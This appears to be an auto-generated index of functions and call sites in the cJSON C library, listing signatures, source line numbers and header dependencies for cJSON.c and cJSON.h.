### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsInvalid(const cJSON * const item)`
- Defined: `cJSON.c:2971`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsFalse(const cJSON * const item)`
- Defined: `cJSON.c:2981`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsTrue(const cJSON * const item)`
- Defined: `cJSON.c:2991`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsBool(const cJSON * const item)`
- Defined: `cJSON.c:3001`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsNull(const cJSON * const item)`
- Defined: `cJSON.c:3011`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsNumber(const cJSON * const item)`
- Defined: `cJSON.c:3021`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsString(const cJSON * const item)`
- Defined: `cJSON.c:3031`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsArray(const cJSON * const item)`
- Defined: `cJSON.c:3041`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsObject(const cJSON * const item)`
- Defined: `cJSON.c:3051`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsRaw(const cJSON * const item)`
- Defined: `cJSON.c:3061`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_...`
- Defined: `cJSON.c:3071`
- Depends on: `cJSON.h`

### cJSON_ArrayForEach (function) `cJSON_ArrayForEach(a_element, a)`
- Defined: `cJSON.c:3157`
- Depends on: `cJSON.h`

### cJSON_ArrayForEach (function) `cJSON_ArrayForEach(b_element, b)`
- Defined: `cJSON.c:3173`
- Doc: doing this twice, once on a and b to prevent true comparison if a subset of b * TODO: Do this the proper way, this is ju
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void *) cJSON_malloc(size_t size)`
- Defined: `cJSON.c:3193`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_free(void *object)`
- Defined: `cJSON.c:3198`
- Depends on: `cJSON.h`

### sprintf (function) `sprintf(version, "%i.%i.%i", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH);`
- Defined: `cJSON.c:128`
- Depends on: `cJSON.h`

### tolower (function) `return tolower(*string1) - tolower(*string2);`
- Defined: `cJSON.c:153`
- Depends on: `cJSON.h`

### void (function) `void (CJSON_CDECL *deallocate)(void *pointer);`
- Defined: `cJSON.c:160`
- Depends on: `cJSON.h`

### malloc (function) `return malloc(size);`
- Defined: `cJSON.c:168`
- Depends on: `cJSON.h`

### free (function) `free(pointer);`
- Defined: `cJSON.c:172`
- Depends on: `cJSON.h`

### realloc (function) `return realloc(pointer, size);`
- Defined: `cJSON.c:176`
- Depends on: `cJSON.h`

### memcpy (function) `memcpy(copy, string, length);`
- Defined: `cJSON.c:205`
- Depends on: `cJSON.h`

### memset (function) `memset(node, '\0', sizeof(cJSON));`
- Defined: `cJSON.c:247`
- Depends on: `cJSON.h`

### cJSON_Delete (function) `cJSON_Delete(item->child);`
- Defined: `cJSON.c:262`
- Depends on: `cJSON.h`

### strcpy (function) `strcpy(object->valuestring, valuestring);`
- Defined: `cJSON.c:464`
- Depends on: `cJSON.h`

### cJSON_free (function) `cJSON_free(object->valuestring);`
- Defined: `cJSON.c:475`
- Depends on: `cJSON.h`

### cJSON_ParseWithLengthOpts (function) `return cJSON_ParseWithLengthOpts(value, buffer_length, return_parse_end, require_null_terminated);`
- Defined: `cJSON.c:1145`
- Depends on: `cJSON.h`

### cJSON_ParseWithOpts (function) `return cJSON_ParseWithOpts(value, 0, 0);`
- Defined: `cJSON.c:1233`
- Depends on: `cJSON.h`

### cJSON_DetachItemViaPointer (function) `return cJSON_DetachItemViaPointer(array, get_array_item(array, (size_t)which));`
- Defined: `cJSON.c:2293`
- Depends on: `cJSON.h`

### cJSON_ReplaceItemViaPointer (function) `return cJSON_ReplaceItemViaPointer(array, get_array_item(array, (size_t)which), newitem);`
- Defined: `cJSON.c:2419`
- Depends on: `cJSON.h`

## cJSON.h

### void (function) `void (CJSON_CDECL *free_fn)(void *ptr);`
- Defined: `cJSON.h:118`
- Imported by: `beacon.c`, `cJSON.c`

### sensitive (function) `* case_sensitive determines if object keys are treated case sensitive (1) or case insensitive (0) */ CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_bo`
- Defined: `cJSON.h:249`
- Imported by: `beacon.c`, `cJSON.c`
